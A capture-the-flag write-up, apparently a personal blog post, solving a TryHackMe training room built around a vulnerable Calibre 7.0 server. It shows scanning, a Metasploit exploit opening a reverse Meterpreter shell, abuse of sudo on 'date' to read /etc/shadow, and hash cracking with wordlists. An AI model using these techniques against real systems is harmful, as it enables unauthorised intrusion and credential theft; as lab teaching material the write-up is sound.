+++
title = "TryHackMe: High Calibre"
date = "2026-08-21T09:16:54+04:00"
#dateFormat = "2006-01-02" # This value can be configured for per-post date formatting
author = "Sasha Bagul"
tags = ["Cybersecurity"]
description = "A writeup showcasing the solution of TryHackMe's room 'High Calibre'. This was an easy and enjoyable room exploring enumeration, exploitation, and hash cracking completed with basic linux privesc. Great room for a beginner."
showFullContent = false
+++

Your friend Simon has asked you to perform a penetration test on his new server he built for his parents library. Can you exploit the machine and capture the flags?
[Room Link](https://tryhackme.com/)

# Enumeration/Recon

{{< code language="bash" title="Initial Port Scan with Rustscan" open="true" >}}
sasha@sasha-backbox-vm  ~/Desktop  rustscan -a 10.48.188.96 -r 1-65535 -u 5000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: allowing you to send UDP packets into the void 1200x faster than NMAP

[~] The config file is expected to be at "/home/sasha/snap/rustscan/436/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.48.188.96:22
Open 10.48.188.96:8008
{{< /code >}}

{{< code language="bash" title="Detailed Service Enumeration With NMAP" open="true" >}}
sasha@sasha-backbox-vm  ~/Desktop  nmap -sCV -p 22,8008 10.48.188.96 -oN /tmp/scan.nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-08-21 00:20 PDT
Nmap scan report for 10.48.188.96
Host is up (0.048s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 dc:8a:5d:6b:3e:f3:36:df:6c:83:6d:a9:99:1e:b9:24 (ECDSA)
|_  256 6f:60:0f:45:50:c5:18:a3:b5:f3:18:af:3e:37:2b:38 (ED25519)
8008/tcp open  http    Calibre Content Server httpd 7.0.0
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: calibre 7.0.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
{{< /code >}}

Based on the port scan and service enumeration, we find out that the server is running Calibre 7.0, an online e-book library software.

{{< figure src="/images/calibre-ss.png" alt="Nmap scan" caption="Calibre running on port 8008" >}}

{{< code language="bash" title="Directory Scan with Gobuster" open="true" >}}
sasha@sasha-backbox-vm  ~/Desktop  gobuster dir -u http://10.48.188.96:8008/ -w /opt/tools/dirs.txt -t 100 | tee /tmp/dirscan.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.48.188.96:8008/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /opt/tools/dirs.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/browse               (Status: 301) [Size: 0] [--> /]
/mobile               (Status: 200) [Size: 2482]
/robots.txt           (Status: 200) [Size: 25]
Progress: 20478 / 20479 (100.00%)
===============================================================
Finished
===============================================================
{{< /code >}}

A directory scan didn't reveal anything useful...

# Exploitation/Initial foothold

Researching online, I found that Calibre 7.0 is vulnerable to a **critical RCE vulnerability (9.8 CVs score!)**. It turns out there is a metasploit module to exploit this: https://www.rapid7.com/db/modules/exploit/multi/misc/calibre_exec/

{{< code language="bash" title="Exploitation with Metasploit Framework" open="true" >}}
msf6 > search calibre 7

Matching Modules
================

   #  Name                             Disclosure Date  Rank       Check  Description
   -  ----                             ---------------  ----       -----  -----------
   0  exploit/multi/misc/calibre_exec  2024-07-31       excellent  Yes    Calibre Python Code Injection (CVE-2024-6782)
   1    \_ target: Windows_Fetch       .                .          .      .
   2    \_ target: Linux Command       .                .          .      .


Interact with a module by name or index. For example info 2, use 2 or use exploit/multi/misc/calibre_exec
After interacting with a module you can manually set a TARGET with set TARGET 'Linux Command'

msf6 > use 0
[*] Using configured payload cmd/windows/http/x64/meterpreter/reverse_tcp

msf6 exploit(multi/misc/calibre_exec) > show targets

Exploit targets:
=================

    Id  Name
    --  ----
    0   Windows_Fetch
=>  1   Linux Command

msf6 exploit(multi/misc/calibre_exec) > show options

Module options (exploit/multi/misc/calibre_exec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,typ
                                       e:host:port][...]
   RHOSTS                    yes       The target host(s), see https://docs.metasp
                                       loit.com/docs/using-metasploit/basics/using
                                       -metasploit.html
   RPORT    8080             yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host

msf6 exploit(multi/misc/calibre_exec) > set target 1
target => 1
msf6 exploit(multi/misc/calibre_exec) > set RPORT 8008
RPORT => 8008
msf6 exploit(multi/misc/calibre_exec) > set RHOSTS 10.48.188.96
RHOSTS => 10.48.188.96
msf6 exploit(multi/misc/calibre_exec) > set LHOST <YOUR IP>
LHOST => 192.168.189.75
msf6 exploit(multi/misc/calibre_exec) > run

[*] Started reverse TCP handler on 192.168.189.75:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Sending payload...
[*] Sending stage (24772 bytes) to 10.48.188.96
[*] Meterpreter session 1 opened (192.168.189.75:4444 -> 10.48.188.96:33148) at 2026-08-21 00:29:09 -0700
[*] Exploit finished, check thy shell.

meterpreter >
{{< /code >}}

{{< code language="bash" title="Upgrading the shell to make it more interactive" open="true" >}}
which python3
/usr/bin/python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
simon@tryhackme:~$ export TERM=xterm
export TERM=xterm
{{< /code >}}
# Lateral movement

Through this exploit, we gain a shell as the user 'simon'. Simon has no sudo privileges and there are no direct ways to root through his account. **However, we see an interesting folder in simon's home folder 'personal'**

```bash
simon@tryhackme:~$ ls -a
ls -a
.                          calibre-complete     ebook-viewer
..                         calibre-customize    fetch-ebook-metadata
.bash_history              calibre-debug        lib
.bash_logout               calibre-library      libexec
.bashrc                    calibre-parallel     lrf2lrs
.cache                     calibre-server       lrfviewer
.config                    calibre-smtp         lrs2lrf
.local                     calibre_postinstall  markdown-calibre
.profile                   calibredb            personal
.ssh                       ebook-convert        plugins
.sudo_as_admin_successful  ebook-device         resources
bin                        ebook-edit           translations
calibre                    ebook-meta           web2disk
calibre-7.0.0-x86_64.txz   ebook-polish
```

Inside the folder, we can grab **FLAG 1** and also we see an interesting file 'db_backup'...

```bash
simon@tryhackme:~$ cd personal
cd personal
simon@tryhackme:~/personal$ ls -a
ls -a
.  ..  db_backup  flag1.txt
```

{{< code language="sql" title="Contents of db_backup" open="true" >}}
CREATE TABLE IF NOT EXISTS users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50) NOT NULL UNIQUE,
    password_hash VARCHAR(100) NOT NULL,
    role VARCHAR(20) DEFAULT 'user',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

INSERT INTO users (username, password_hash, role)
VALUES ('john', '*C11FC4120FC1FF52DCE39A59098853C0F1F1B798', 'admin');
{{< /code >}}

Through this, we get the password hash of user 'john' and we see that he has the role of 'admin', which could hint at further privilege escalation.

#### Hash cracking @ crackstation.net

Using crackstation, we find out the value of John's hash and use that to log into his account...

{{< figure src="/images/crackstation-ss.png" alt="Nmap scan" caption="Crackstation used to crack john's hash" >}}

# User 'John' to Root User

We find **FLAG 2** in John's home directory:

```bash
john@tryhackme:~$ ls
flag2.txt
```

Using `sudo -l`, we can identify that the user 'john' has **sudo privileges over /usr/bin/date**.

```bash
john@tryhackme:~$ sudo -l
sudo -l
Matching Defaults entries for john on tryhackme:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User john may run the following commands on tryhackme:
    (ALL) NOPASSWD: /usr/bin/date
```

Using [GTFObins](https://gtfobins.org/) we find out that this command can be used to read files. **Combined with sudo privileges, this can allow for us to read any file**. If you read `/etc/shadow/`, you can get the **ROOT HASH**.

{{< figure src="/images/gtfobins-ss.png" alt="Nmap scan" caption="Calibre running on port 8008" >}}

```bash
john@tryhackme:~$ sudo /usr/bin/date -f /etc/shadow
sudo /usr/bin/date -f /etc/shadow
/usr/bin/date: invalid date ‘root:$6$ji6fvk6cAipByvHb$SFi1kvFpgl30sVy435YwFOGThJOdG2DHagtQGyIUHWt.KVHfuVaUpMVqVfyaEGiAN2POQhFUZjSev/5ebFiGw0:20668:0:99999:7:::’
/usr/bin/date: invalid date ‘daemon:*:20305:0:99999:7:::’
/usr/bin/date: invalid date ‘bin:*:20305:0:99999:7:::’
/usr/bin/date: invalid date ‘sys:*:20305:0:99999:7:::’
/usr/bin/date: invalid date ‘sync:*:20305:0:99999:7:::’
/usr/bin/date: invalid date ‘games:*:20305:0:99999:7:::’
/usr/bin/date: invalid date ‘man:*:20305:0:99999:7:::’
/usr/bin/date: invalid date ‘lp:*:20305:0:99999:7:::’
/usr/bin/date: invalid date ‘mail:*:20305:0:99999:7:::’
/usr/bin/date: invalid date ‘news:*:20305:0:99999:7:::’
/usr/bin/date: invalid date ‘uucp:*:20305:0:99999:7:::’
/usr/bin/date: invalid date ‘proxy:*:20305:0:99999:7:::’
/usr/bin/date: invalid date ‘www-data:*:20305:0:99999:7:::’
/usr/bin/date: invalid date ‘backup:*:20305:0:99999:7:::’
/usr/bin/date: invalid date ‘list:*:20305:0:99999:7:::’
/usr/bin/date: invalid date ‘irc:*:20305:0:99999:7:::’
/usr/bin/date: invalid date ‘_apt:*:20305:0:99999:7:::’
/usr/bin/date: invalid date ‘nobody:*:20305:0:99999:7:::’
/usr/bin/date: invalid date ‘systemd-network:!*:20305::::::’
/usr/bin/date: invalid date ‘systemd-timesync:!*:20305::::::’
/usr/bin/date: invalid date ‘dhcpcd:!:20305::::::’
/usr/bin/date: invalid date ‘messagebus:!:20305::::::’
/usr/bin/date: invalid date ‘systemd-resolve:!*:20305::::::’
/usr/bin/date: invalid date ‘pollinate:!:20305::::::’
/usr/bin/date: invalid date ‘polkitd:!*:20305::::::’
/usr/bin/date: invalid date ‘usbmux:!:20666::::::’
/usr/bin/date: invalid date ‘sshd:!:20666::::::’
/usr/bin/date: invalid date ‘simon:$6$J8kRgXZ9RETK/m6F$3mWl5UreVz7G/N6N5Uinb0Sz8DBFRLHSFxzdq0XKfxC8jFu3Yjbju/ykbLEMYihJWepG30WB8Cl/Jbl1UtAYY.:20668:0:99999:7:::’
/usr/bin/date: invalid date ‘john:$6$rY0LbSEaCHZ.QhPT$emTD2b0oS.8M0hg7UyFQuLqGQgZ6Y9T0q1xu69pUSodwfCr0EDOY4pGpHWT0s0ikYfGFMqJ.K/bRiKH3U1UJp1:20668:0:99999:7:::’
```

The root hash is the strings between the first and second colons, thus it is '$6$ji6fvk6cAipByvHb$SFi1kvFpgl30sVy435YwFOGThJOdG2DHagtQGyIUHWt.KVHfuVaUpMVqVfyaEGiAN2POQhFUZjSev/5ebFiGw0'. When cracked with **john the ripper** we can get the value...

{{< code language="bash" title="Cracking the root hash" open="true" >}}
sasha@sasha-backbox-vm  ~/.john  echo '$6$ji6fvk6cAipByvHb$SFi1kvFpgl30sVy435YwFOGThJOdG2DHagtQGyIUHWt.KVHfuVaUpMVqVfyaEGiAN2POQhFUZjSev/5ebFiGw0' > hash
 sasha@sasha-backbox-vm  ~/.john  john --wordlist=/opt/tools/rockyou.txt hash
Loaded 1 password hash (crypt, generic crypt(3) [?/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
jesus7           (?)
1g 0:00:00:01 100% 0.7812g/s 1500p/s 1500c/s 1500C/s cristiano..hercules
Use the "--show" option to display all of the cracked passwords reliably
Session completed
{{< /code >}}

### We can log into root with these creds and retrieve Flag 3!

---

Thanks for reading this! This is my first TryHackMe room. Any bugs/suggestions/alternate privesc paths can be reported to alexanderguitarboy@gmail.com...

